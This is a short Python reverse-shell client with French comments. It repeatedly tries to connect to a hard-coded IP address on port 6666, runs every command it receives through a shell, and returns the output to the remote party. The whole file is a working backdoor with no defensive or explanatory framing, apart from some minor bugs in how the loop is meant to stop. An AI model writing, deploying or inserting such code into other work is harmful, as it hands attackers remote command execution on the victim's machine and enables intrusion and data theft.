import socket, os, subprocess, time, errno

def connect():
    # Tenter la connection, le socket est assigne globalement pour servir ailleur
    tip = "10.101.200.61" # Target IP
    tport = 6666 # Target port
    global s
    retry = True
    while retry:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((tip, tport))
            print("Socket connected !")
            retry = False
        except:
            retry = True


def receive():
    cmd = s.recv(1024)
    if str(cmd) == "quit":
        print("Remote issued 'quit' command. Terminating socket now.")
        keepAlive = False
        send("Closing")
        return
    else:
        print("Issuing command : " + cmd)
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out = process.stdout.read() + process.stderr.read()
        send(out)
        return

def send(data):
    s.send(data)

global keepAlive
keepAlive = True

connect()

while keepAlive:
    receive()

s.close
print("### END ###")